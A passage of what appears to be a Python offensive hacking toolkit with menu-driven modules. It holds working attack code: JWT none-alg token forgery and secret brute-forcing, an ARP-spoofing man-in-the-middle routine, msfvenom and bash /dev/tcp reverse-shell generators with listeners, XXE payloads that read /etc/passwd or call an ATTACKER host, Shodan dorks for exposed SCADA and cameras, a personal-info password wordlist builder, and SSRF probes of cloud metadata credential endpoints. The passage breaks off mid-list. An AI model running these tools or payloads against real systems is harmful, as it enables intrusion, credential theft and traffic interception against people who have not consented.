            progress_bar(i+1, total, prefix=f"{SC}Testing Admin Paths{SR}")
        print()
        return found

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║          WEB HACKING SUITE               ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Web Hacking Modules:{SR}")
        print(f"  {SC}[1]{SR} Directory Buster")
        print(f"  {SC}[2]{SR} Admin Page Finder")
        print(f"  {SC}[3]{SR} XSS Test")
        print(f"  {SC}[4]{SR} SQL Injection Test")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        url = input(f"{SG}[+] Target URL: {SR}")
        if choice == "1":
            self.directory_buster(url)
        elif choice == "2":
            self.admin_finder(url)
        elif choice == "3":
            param = input(f"{SG}[+] Parameter to test: {SR}")
            XSSInjector().test_reflected(url, param)
        elif choice == "4":
            param = input(f"{SG}[+] Parameter to test: {SR}")
            SQLInjector().test_injection(url, param)
        pause()

class SteganoTool:
    def __init__(self):
        self.name = "STEGANOGRAPHY TOOL"

    def lsb_encode(self, image_path, message, output_path):
        try:
            from PIL import Image
        except ImportError:
            _pip_install("Pillow")
            from PIL import Image

        img = Image.open(image_path).convert("RGB")
        pixels = list(img.getdata())
        message += chr(0)
        binary = ''.join(format(ord(c), '08b') for c in message)

        if len(binary) > len(pixels) * 3:
            print(f"{R}[!] Message too large for this image{SR}")
            return

        new_pixels = []
        bit_idx = 0
        for pixel in pixels:
            r, g, b = pixel
            if bit_idx < len(binary):
                r = (r & ~1) | int(binary[bit_idx]); bit_idx += 1
            if bit_idx < len(binary):
                g = (g & ~1) | int(binary[bit_idx]); bit_idx += 1
            if bit_idx < len(binary):
                b = (b & ~1) | int(binary[bit_idx]); bit_idx += 1
            new_pixels.append((r, g, b))

        img.putdata(new_pixels)
        img.save(output_path, "PNG")
        print(f"    {SG}[+] Message hidden in {output_path}{SR}")

    def lsb_decode(self, image_path):
        try:
            from PIL import Image
        except ImportError:
            _pip_install("Pillow")
            from PIL import Image

        img = Image.open(image_path).convert("RGB")
        pixels = list(img.getdata())
        bits = []
        for pixel in pixels:
            for channel in pixel:
                bits.append(str(channel & 1))

        binary = ''.join(bits)
        message = ""
        for i in range(0, len(binary), 8):
            byte = binary[i:i+8]
            if len(byte) < 8:
                break
            char = chr(int(byte, 2))
            if char == chr(0):
                break
            message += char
        print(f"\n    {SG}[+] Hidden message: {message}{SR}")
        return message

    def strings_extract(self, file_path, min_len=4):
        print(f"\n{SC}[*] Extracting strings from {file_path}{SR}")
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            result = re.findall(rb"[\x20-\x7e]{%d,}" % min_len, data)
            for s in result[:100]:
                print(f"    {s.decode('utf-8', errors='ignore')}")
            print(f"\n    {SG}[+] {len(result)} strings found (showing first 100){SR}")
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SM}
    ╔═══════════════════════════════════════════╗
    ║        STEGANOGRAPHY TOOL                ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Stegano Modules:{SR}")
        print(f"  {SC}[1]{SR} Hide message in PNG (LSB)")
        print(f"  {SC}[2]{SR} Extract hidden message from PNG")
        print(f"  {SC}[3]{SR} Extract strings from file")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            img = input(f"{SG}[+] Input image path: {SR}")
            msg = input(f"{SG}[+] Message to hide: {SR}")
            out = input(f"{SG}[+] Output path (.png): {SR}") or "output.png"
            self.lsb_encode(img, msg, out)
        elif choice == "2":
            img = input(f"{SG}[+] Image path: {SR}")
            self.lsb_decode(img)
        elif choice == "3":
            f = input(f"{SG}[+] File path: {SR}")
            self.strings_extract(f)
        pause()

class JWTTool:
    def __init__(self):
        self.name = "JWT TOOL"

    def decode(self, token):
        print(f"\n{SC}[*] Decoding JWT{SR}")
        try:
            parts = token.split(".")
            if len(parts) != 3:
                print(f"    {R}[!] Invalid JWT format{SR}")
                return

            def b64d(s):
                s += "=" * (-len(s) % 4)
                return base64.urlsafe_b64decode(s).decode()

            header = json.loads(b64d(parts[0]))
            payload = json.loads(b64d(parts[1]))
            signature = parts[2]

            print(f"\n  {SG}[+] HEADER:{SR}")
            print(f"  {W}{json.dumps(header, indent=2)}{SR}")
            print(f"\n  {SG}[+] PAYLOAD:{SR}")
            print(f"  {W}{json.dumps(payload, indent=2)}{SR}")
            print(f"\n  {SG}[+] SIGNATURE:{SR}")
            print(f"  {W}{signature}{SR}")

            alg = header.get("alg", "").lower()
            if alg == "none":
                print(f"\n    {R}[!] ALG=none vulnerability! Server may accept unsigned tokens.{SR}")
            if alg == "hs256":
                print(f"\n    {SY}[!] HS256 detected - try brute forcing the secret{SR}")

            if "exp" in payload:
                exp_date = datetime.fromtimestamp(payload["exp"])
                if exp_date < datetime.now():
                    print(f"\n    {R}[!] Token EXPIRED on {exp_date}{SR}")
                else:
                    print(f"\n    {SG}[+] Token expires {exp_date}{SR}")
            return {"header": header, "payload": payload, "signature": signature}
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def none_alg_attack(self, token):
        print(f"\n{SC}[*] Generating none-alg attack payload{SR}")
        try:
            parts = token.split(".")
            payload_b64 = parts[1]
            payload_b64 += "=" * (-len(payload_b64) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())

            new_header = {"alg": "none", "typ": "JWT"}
            new_header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
            new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            forged = f"{new_header_b64}.{new_payload_b64}."

            print(f"\n    {SG}[+] Forged JWT (try this):{SR}")
            print(f"    {W}{forged}{SR}")
            return forged
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def brute_secret(self, token, wordlist_file=None):
        try:
            import hmac
        except ImportError:
            return

        print(f"\n{SC}[*] Brute forcing JWT secret (HS256){SR}")
        common_secrets = ["secret", "password", "123456", "admin", "jwt_secret", "key", "mysecret", "qwerty", "12345", "changeme", "supersecret", "jwtsecret", "default", "test"]

        if wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, "r", errors="ignore") as f:
                    common_secrets = [l.strip() for l in f]
            except:
                pass

        parts = token.split(".")
        header_payload = f"{parts[0]}.{parts[1]}".encode()
        target_sig = parts[2]

        for secret in common_secrets:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), header_payload, hashlib.sha256).digest()
            ).decode().rstrip("=")
            if sig == target_sig:
                print(f"\n    {SG}[+] SECRET FOUND: {secret}{SR}")
                return secret
        print(f"    {SY}[-] Secret not found in wordlist{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SY}
    ╔═══════════════════════════════════════════╗
    ║            JWT TOOL                      ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] JWT Modules:{SR}")
        print(f"  {SC}[1]{SR} Decode JWT")
        print(f"  {SC}[2]{SR} Generate none-alg attack")
        print(f"  {SC}[3]{SR} Brute force HS256 secret")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        token = input(f"{SG}[+] JWT token: {SR}").strip()
        if choice == "1":
            self.decode(token)
        elif choice == "2":
            self.none_alg_attack(token)
        elif choice == "3":
            wl = input(f"{SG}[+] Wordlist path (Enter for default): {SR}")
            self.brute_secret(token, wl or None)
        pause()

class SubdomainTakeover:
    FINGERPRINTS = {
        "github.io": "There isn't a GitHub Pages site here",
        "herokuapp.com": "No such app",
        "bitbucket.io": "Repository not found",
        "s3.amazonaws.com": "NoSuchBucket",
        "azurewebsites.net": "404 Web Site not found",
        "cloudfront.net": "Bad request",
        "shopify.com": "Sorry, this shop is currently unavailable",
        "tumblr.com": "Whatever you were looking for doesn't currently exist",
        "wordpress.com": "Do you want to register",
        "zendesk.com": "Help Center Closed",
        "readme.io": "Project doesnt exist",
        "fastly.net": "Fastly error: unknown domain",
        "surge.sh": "project not found",
    }

    def __init__(self):
        self.name = "SUBDOMAIN TAKEOVER"

    def check(self, subdomain):
        if not subdomain.startswith("http"):
            subdomain = "https://" + subdomain
        try:
            r = requests.get(subdomain, timeout=8, verify=False, allow_redirects=True,
                           headers={"User-Agent": random_ua()})
            for provider, fingerprint in self.FINGERPRINTS.items():
                if fingerprint.lower() in r.text.lower():
                    print(f"    {R}[!] VULNERABLE: {subdomain} -> {provider} takeover possible!{SR}")
                    return provider
            print(f"    {SG}[+] {subdomain} looks OK{SR}")
        except requests.exceptions.ConnectionError:
            print(f"    {SY}[?] {subdomain} - DNS/Connection failed (potentially dangling){SR}")
        except Exception as e:
            print(f"    {SY}[-] {subdomain} - {e}{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║      SUBDOMAIN TAKEOVER SCANNER          ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Modes:{SR}")
        print(f"  {SC}[1]{SR} Check single subdomain")
        print(f"  {SC}[2]{SR} Check list from file")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            sub = input(f"{SG}[+] Subdomain (e.g., blog.example.com): {SR}")
            self.check(sub)
        elif choice == "2":
            file = input(f"{SG}[+] File with subdomains (one per line): {SR}")
            try:
                with open(file, "r") as f:
                    subs = [l.strip() for l in f if l.strip()]
                with ThreadPoolExecutor(max_workers=10) as exe:
                    for sub in subs:
                        exe.submit(self.check, sub)
            except Exception as e:
                print(f"{R}[!] Error: {e}{SR}")
        pause()

class ShodanSearch:
    def __init__(self):
        self.name = "SHODAN SEARCH"
        self.key_file = os.path.join(TOOLS_DIR, ".shodan_key")
        self.api_key = self.load_key()

    def load_key(self):
        if os.path.exists(self.key_file):
            try:
                with open(self.key_file) as f:
                    return f.read().strip()
            except:
                return None
        return None

    def save_key(self, key):
        with open(self.key_file, "w") as f:
            f.write(key)
        os.chmod(self.key_file, 0o600)

    def search(self, query):
        print(f"\n{SC}[*] Shodan search: {query}{SR}")
        try:
            r = requests.get(
                "https://api.shodan.io/shodan/host/search",
                params={"key": self.api_key, "query": query, "limit": 20},
                timeout=15
            )
            if r.status_code != 200:
                print(f"{R}[!] Shodan API error {r.status_code}: {r.text[:200]}{SR}")
                return
            data = r.json()
            total = data.get("total", 0)
            print(f"    {SG}[+] Total results: {total}{SR}\n")
            for match in data.get("matches", [])[:20]:
                ip = match.get("ip_str", "?")
                port = match.get("port", "?")
                org = match.get("org", "Unknown")
                product = match.get("product", "")
                country = match.get("location", {}).get("country_name", "")
                print(f"    {SG}[+] {ip}:{port} | {org} | {product} | {country}{SR}")
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def host_info(self, ip):
        print(f"\n{SC}[*] Shodan host info: {ip}{SR}")
        try:
            r = requests.get(f"https://api.shodan.io/shodan/host/{ip}",
                           params={"key": self.api_key}, timeout=15)
            if r.status_code != 200:
                print(f"{R}[!] API error {r.status_code}{SR}")
                return
            data = r.json()
            print(f"    {SG}[+] Org: {data.get('org', 'N/A')}{SR}")
            print(f"    {SG}[+] OS: {data.get('os', 'N/A')}{SR}")
            print(f"    {SG}[+] Country: {data.get('country_name', 'N/A')}{SR}")
            print(f"    {SG}[+] Open ports: {data.get('ports', [])}{SR}")
            print(f"    {SG}[+] Hostnames: {data.get('hostnames', [])}{SR}")
            if data.get("vulns"):
                print(f"    {R}[!] Vulnerabilities: {list(data.get('vulns', []))[:10]}{SR}")
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SC}
    ╔═══════════════════════════════════════════╗
    ║           SHODAN SEARCH                  ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        if not self.api_key:
            print(f"{SY}[!] No Shodan API key found.{SR}")
            print(f"{SC}[i] Get a free key at: https://account.shodan.io{SR}")
            k = input(f"{SG}[+] Enter Shodan API key: {SR}").strip()
            if k:
                self.save_key(k)
                self.api_key = k

        print(f"{SY}[!] Modules:{SR}")
        print(f"  {SC}[1]{SR} Search Shodan (e.g., 'apache port:80 country:FR')")
        print(f"  {SC}[2]{SR} Host info by IP")
        print(f"  {SC}[3]{SR} Popular dorks")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            q = input(f"{SG}[+] Query: {SR}")
            self.search(q)
        elif choice == "2":
            ip = input(f"{SG}[+] IP: {SR}")
            self.host_info(ip)
        elif choice == "3":
            dorks = [
                'webcamxp country:"FR"',
                'product:"MongoDB" port:27017',
                'product:"Elasticsearch"',
                '"default password"',
                'port:3389 has_screenshot:true',
                'product:"Jenkins"',
                'title:"SCADA"',
                'port:5900 authentication disabled',
            ]
            for d in dorks:
                print(f"  {SG}[+] {d}{SR}")
        pause()

class FileAnalyzer:
    def __init__(self):
        self.name = "FILE ANALYZER"

    def hash_file(self, path):
        print(f"\n{SC}[*] Hashing {path}{SR}")
        try:
            with open(path, "rb") as f:
                data = f.read()
            print(f"  {SG}Size: {len(data)} bytes{SR}")
            print(f"  {SG}MD5:    {hashlib.md5(data).hexdigest()}{SR}")
            print(f"  {SG}SHA1:   {hashlib.sha1(data).hexdigest()}{SR}")
            print(f"  {SG}SHA256: {hashlib.sha256(data).hexdigest()}{SR}")
            print(f"  {SG}SHA512: {hashlib.sha512(data).hexdigest()}{SR}")
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def magic_bytes(self, path):
        print(f"\n{SC}[*] Magic bytes detection: {path}{SR}")
        signatures = {
            b"\x89PNG": "PNG image",
            b"\xff\xd8\xff": "JPEG image",
            b"GIF8": "GIF image",
            b"PK\x03\x04": "ZIP / JAR / DOCX / APK",
            b"\x7fELF": "ELF Linux binary",
            b"MZ": "Windows PE (EXE/DLL)",
            b"%PDF": "PDF document",
            b"Rar!": "RAR archive",
            b"\x1f\x8b": "GZIP archive",
            b"BM": "BMP image",
            b"\x00\x00\x01\x00": "ICO icon",
            b"\xca\xfe\xba\xbe": "Java class / Mach-O fat",
            b"\xce\xfa\xed\xfe": "Mach-O 32-bit",
            b"\xcf\xfa\xed\xfe": "Mach-O 64-bit",
        }
        try:
            with open(path, "rb") as f:
                header = f.read(16)
            print(f"    {SY}First bytes: {header[:8].hex()}{SR}")
            for sig, name in signatures.items():
                if header.startswith(sig):
                    print(f"    {SG}[+] Detected: {name}{SR}")
                    return name
            print(f"    {SY}[-] Unknown signature{SR}")
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def entropy(self, path):
        import math
        print(f"\n{SC}[*] Shannon entropy: {path}{SR}")
        try:
            with open(path, "rb") as f:
                data = f.read()
            if not data:
                print(f"    {SY}[-] Empty file{SR}")
                return
            freq = {}
            for b in data:
                freq[b] = freq.get(b, 0) + 1
            entropy = 0
            for count in freq.values():
                p = count / len(data)
                entropy -= p * math.log2(p)
            print(f"    {SG}Entropy: {entropy:.4f} / 8{SR}")
            if entropy > 7.5:
                print(f"    {R}[!] High entropy - likely encrypted/compressed/packed{SR}")
            elif entropy < 4:
                print(f"    {SG}[+] Low entropy - plain text/data{SR}")
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SB}
    ╔═══════════════════════════════════════════╗
    ║           FILE ANALYZER                  ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Modules:{SR}")
        print(f"  {SC}[1]{SR} Hash file (MD5/SHA1/SHA256/SHA512)")
        print(f"  {SC}[2]{SR} Magic bytes / file type")
        print(f"  {SC}[3]{SR} Entropy analysis (detect encrypted/packed)")
        print(f"  {SC}[4]{SR} Full analysis (all of the above)")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        path = input(f"{SG}[+] File path: {SR}")
        if choice == "1":
            self.hash_file(path)
        elif choice == "2":
            self.magic_bytes(path)
        elif choice == "3":
            self.entropy(path)
        elif choice == "4":
            self.magic_bytes(path)
            self.hash_file(path)
            self.entropy(path)
        pause()

class PayloadGenerator:
    def __init__(self):
        self.name = "PAYLOAD GENERATOR"

    def xor_encode(self, shellcode, key):
        return bytes([b ^ key for b in shellcode])

    def generate_msfvenom(self, platform, lhost, lport, fmt):
        payloads = {
            "linux": "linux/x64/shell_reverse_tcp",
            "windows": "windows/x64/meterpreter/reverse_tcp",
            "android": "android/meterpreter/reverse_tcp",
            "macos": "osx/x64/shell_reverse_tcp",
            "php": "php/meterpreter_reverse_tcp",
            "python": "python/meterpreter/reverse_tcp",
        }
        payload = payloads.get(platform.lower(), "linux/x64/shell_reverse_tcp")
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o payload.{fmt}"
        print(f"\n  {SG}[+] Command:{SR}")
        print(f"  {W}{cmd}{SR}")
        print(f"\n  {SY}[!] Listener setup:{SR}")
        print(f"  {W}msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run'{SR}")
        return cmd

    def xor_obfuscate(self, text):
        key = random.randint(1, 255)
        encoded = self.xor_encode(text.encode(), key)
        print(f"\n  {SG}[+] XOR key: 0x{key:02x}{SR}")
        print(f"  {SG}[+] Encoded (hex): {encoded.hex()}{SR}")
        print(f"\n  {SY}[!] Python decoder:{SR}")
        print(f'  {W}bytes([b ^ {key} for b in bytes.fromhex("{encoded.hex()}")]).decode(){SR}')

    def powershell_b64(self, command):
        encoded = base64.b64encode(command.encode("utf-16-le")).decode()
        print(f"\n  {SG}[+] Encoded command:{SR}")
        print(f"  {W}powershell -EncodedCommand {encoded}{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║         PAYLOAD GENERATOR                ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Modules:{SR}")
        print(f"  {SC}[1]{SR} Msfvenom payload command")
        print(f"  {SC}[2]{SR} XOR obfuscate string")
        print(f"  {SC}[3]{SR} PowerShell -EncodedCommand")
        print(f"  {SC}[4]{SR} Bash one-liner reverse shell")
        choice = input(f"\n{SG}[+] Choice: {SR}")

        if choice == "1":
            plat = input(f"{SG}[+] Platform (linux/windows/android/macos/php/python): {SR}")
            lhost = input(f"{SG}[+] LHOST: {SR}")
            lport = input(f"{SG}[+] LPORT: {SR}")
            fmt = input(f"{SG}[+] Format (elf/exe/apk/macho/raw/ps1): {SR}") or "elf"
            self.generate_msfvenom(plat, lhost, lport, fmt)
        elif choice == "2":
            txt = input(f"{SG}[+] Text to obfuscate: {SR}")
            self.xor_obfuscate(txt)
        elif choice == "3":
            cmd = input(f"{SG}[+] PowerShell command: {SR}")
            self.powershell_b64(cmd)
        elif choice == "4":
            ip = input(f"{SG}[+] LHOST: {SR}")
            port = input(f"{SG}[+] LPORT: {SR}")
            print(f"\n  {SG}[+] Bash reverse shell (one-liner):{SR}")
            print(f"  {W}bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'{SR}")
            print(f"\n  {SG}[+] URL-encoded version (for injection):{SR}")
            payload = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
            print(f"  {W}{quote(payload)}{SR}")
            print(f"\n  {SY}[!] Listener:{SR}")
            print(f"  {W}nc -lvnp {port}{SR}")
        pause()

class ARPSpoofer:
    def __init__(self):
        self.name = "ARP SPOOFER"
        self.running = False

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("ARP SPOOFER / MITM", color=R)
        print(f"\n{SY}[!] Requires root + scapy + IP forwarding enabled{SR}")
        print(f"{SY}[!] Linux only - uses Layer 2 crafted packets{SR}\n")

        try:
            from scapy.all import ARP, send, sniff, getmacbyip, conf
        except ImportError:
            print(f"{SY}[!] Installing scapy...{SR}")
            _pip_install("scapy")
            from scapy.all import ARP, send, sniff, getmacbyip, conf

        target_ip = input(f"{SG}[+] Target IP (victim): {SR}")
        gateway_ip = input(f"{SG}[+] Gateway IP (router): {SR}")
        duration = int(input(f"{SG}[+] Duration in seconds (Enter=30): {SR}") or "30")

        try:
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(gateway_ip)
            if not target_mac or not gateway_mac:
                print(f"{R}[!] Could not resolve MAC addresses{SR}")
                return

            print(f"\n{SG}[+] Target MAC:  {target_mac}{SR}")
            print(f"{SG}[+] Gateway MAC: {gateway_mac}{SR}")

            status(f"STARTING ARP POISONING FOR {duration}s", "hit")

            attacker_mac = conf.iface.mac if hasattr(conf.iface, 'mac') else "ff:ff:ff:ff:ff:ff"

            end = time.time() + duration
            count = 0
            while time.time() < end:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
                count += 2
                sys.stdout.write(f"\r{SC}[+] Packets sent: {count} | Elapsed: {int(time.time() - (end - duration))}s{SR}")
                sys.stdout.flush()
                time.sleep(2)

            print(f"\n{SY}[*] Restoring ARP tables...{SR}")
            for _ in range(5):
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), verbose=0)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), verbose=0)

            print(f"{SG}[+] ARP tables restored. Attack complete.{SR}")
        except Exception as e:
            print(f"{R}[!] Error: {e}{SR}")
        pause()

class CVEScanner:
    def __init__(self):
        self.name = "CVE SCANNER"

    def search_nvd(self, keyword):
        print(f"\n{SC}[*] Searching NVD for: {keyword}{SR}")
        spinner = Spinner("Querying NVD database").start()
        try:
            r = requests.get(
                "https://services.nvd.nist.gov/rest/json/cves/2.0",
                params={"keywordSearch": keyword, "resultsPerPage": 15},
                timeout=20
            )
            spinner.stop()
            if r.status_code != 200:
                print(f"{R}[!] NVD API error {r.status_code}{SR}")
                return
            data = r.json()
            total = data.get("totalResults", 0)
            print(f"    {SG}[+] Total CVEs: {total}{SR}\n")

            for item in data.get("vulnerabilities", [])[:15]:
                cve = item.get("cve", {})
                cve_id = cve.get("id", "?")
                desc = cve.get("descriptions", [{}])[0].get("value", "")[:120]

                metrics = cve.get("metrics", {})
                severity = "?"
                score = "?"
                for metric_type in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                    if metric_type in metrics:
                        m = metrics[metric_type][0]
                        score = m.get("cvssData", {}).get("baseScore", "?")
                        severity = m.get("cvssData", {}).get("baseSeverity", m.get("baseSeverity", "?"))
                        break

                color = R if severity in ("CRITICAL", "HIGH") else SY if severity == "MEDIUM" else SG
                print(f"  {color}[{severity}] {cve_id} - Score: {score}{SR}")
                print(f"  {W}{desc}...{SR}\n")
        except Exception as e:
            spinner.stop()
            print(f"{R}[!] Error: {e}{SR}")

    def banner_cve_check(self, target, port):
        print(f"\n{SC}[*] Banner grabbing + CVE lookup: {target}:{port}{SR}")
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((target, int(port)))
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = sock.recv(1024).decode(errors='ignore')
            sock.close()

            print(f"    {SG}[+] Banner:{SR}")
            print(f"    {W}{banner[:300]}{SR}\n")

            product_match = re.search(r'Server:\s*([^\r\n]+)', banner)
            if product_match:
                product = product_match.group(1).strip()
                print(f"    {SY}[*] Detected: {product}{SR}")
                self.search_nvd(product)
        except Exception as e:
            print(f"    {R}[!] Error: {e}{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("CVE SCANNER (NVD API)", color=SY)
        print(f"\n{SY}[!] Modules:{SR}")
        print(f"  {SC}[1]{SR} Search CVEs by keyword (e.g., 'apache 2.4')")
        print(f"  {SC}[2]{SR} Banner grab + auto CVE lookup")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            q = input(f"{SG}[+] Keyword: {SR}")
            self.search_nvd(q)
        elif choice == "2":
            t = input(f"{SG}[+] Target IP: {SR}")
            p = input(f"{SG}[+] Port: {SR}")
            self.banner_cve_check(t, p)
        pause()

class WordlistGenerator:
    def __init__(self):
        self.name = "WORDLIST GENERATOR"

    def mutate(self, base_word):
        """Apply common password mutations (leet, capitalize, numbers, years, symbols)."""
        leet_map = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$", "t": "7"}
        mutations = set()

        variants = [base_word, base_word.lower(), base_word.upper(), base_word.capitalize()]

        for v in variants:
            mutations.add(v)

            leet = "".join(leet_map.get(c.lower(), c) for c in v)
            mutations.add(leet)

            for suffix in ["", "!", "?", ".", "123", "1234", "12345", "01", "1", "2", "!@#"]:
                mutations.add(v + suffix)

            for year in range(2015, 2027):
                mutations.add(f"{v}{year}")
                mutations.add(f"{v}{str(year)[-2:]}")

            mutations.add(v + v.lower())
            mutations.add(v[::-1])

        return mutations

    def combine_words(self, words):
        """Generate combinations of words."""
        combos = set()
        for w1 in words:
            combos.add(w1)
            for w2 in words:
                if w1 != w2:
                    combos.add(w1 + w2)
                    combos.add(w1 + "_" + w2)
                    combos.add(w1 + "." + w2)
                    combos.add(w1 + "-" + w2)
        return combos

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("WORDLIST GENERATOR", color=SG)
        print(f"\n{SY}[!] Generate custom wordlists based on target info{SR}\n")

        print(f"{SC}[+] Target profile info (comma-separated, Enter to skip):{SR}")
        name = input(f"{SG}[+] Names (firstname,lastname,nickname): {SR}")
        birth = input(f"{SG}[+] Important dates (1990,2000,...): {SR}")
        extras = input(f"{SG}[+] Other keywords (company,pet,city,...): {SR}")
        out_file = input(f"{SG}[+] Output file (Enter=wordlist.txt): {SR}") or "wordlist.txt"

        all_words = set()
        for src in (name, extras):
            for w in src.split(","):
                w = w.strip()
                if w:
                    all_words.update(self.mutate(w))

        for d in birth.split(","):
            d = d.strip()
            if d:
                all_words.add(d)
                if len(d) == 4:
                    all_words.add(d[2:])

        combos = self.combine_words([w for w in all_words if len(w) < 12][:20])
        all_words.update(combos)

        with Spinner(f"Writing {out_file}") as _:
            with open(out_file, "w") as f:
                for w in sorted(all_words):
                    if 4 <= len(w) <= 32:
                        f.write(w + "\n")
            time.sleep(0.3)

        count = sum(1 for _ in open(out_file))
        print(f"\n{SG}[+] Wordlist saved: {out_file} ({count} unique entries){SR}")
        print(f"{SY}[!] Preview (first 15):{SR}")
        with open(out_file) as f:
            for i, line in enumerate(f):
                if i >= 15:
                    break
                print(f"  {W}{line.strip()}{SR}")
        pause()

class XXEInjector:
    PAYLOADS = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "Linux /etc/passwd read"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', "Windows win.ini read"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/">]><foo>&xxe;</foo>', "SSRF via XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>', "OOB XXE with external DTD"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "PHP wrapper file read"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>', "Linux env vars leak"),
        ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>', "Billion Laughs DoS"),
    ]

    def test(self, url):
        print(f"\n{SC}[*] Testing XXE injection on {url}{SR}\n")
        indicators = ["root:x:", "daemon:", "[fonts]", "www-data", "bin/bash", "usr/sbin"]

        for i, (payload, desc) in enumerate(self.PAYLOADS):
            progress_bar(i + 1, len(self.PAYLOADS), prefix=f"{SC}Testing{SR}")
            try:
                r = requests.post(url,
                                data=payload,
                                headers={"Content-Type": "application/xml", "User-Agent": random_ua()},
                                timeout=8, verify=False)
                body = r.text.lower()
                if any(ind.lower() in body for ind in indicators):
                    print(f"\n    {R}[!] VULNERABLE: {desc}{SR}")
                    print(f"    {SY}Response excerpt: {r.text[:200]}{SR}")
            except:
                pass
        print()

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("XXE INJECTION TESTER", color=R)
        print(f"\n{SY}[!] Tests XML External Entity injection on endpoints accepting XML{SR}\n")

        print(f"{SY}[!] Modules:{SR}")
        print(f"  {SC}[1]{SR} Test endpoint with XXE payloads")
        print(f"  {SC}[2]{SR} Show all XXE payloads")
        choice = input(f"\n{SG}[+] Choice: {SR}")

        if choice == "1":
            url = input(f"{SG}[+] Target URL (POST endpoint accepting XML): {SR}")
            self.test(url)
        elif choice == "2":
            for payload, desc in self.PAYLOADS:
                print(f"\n  {SC}[{desc}]{SR}")
                print(f"  {W}{payload}{SR}")
        pause()

class SSRFScanner:
    INTERNAL_TARGETS = [
        "http://127.0.0.1/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:8080/",
        "http://localhost/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
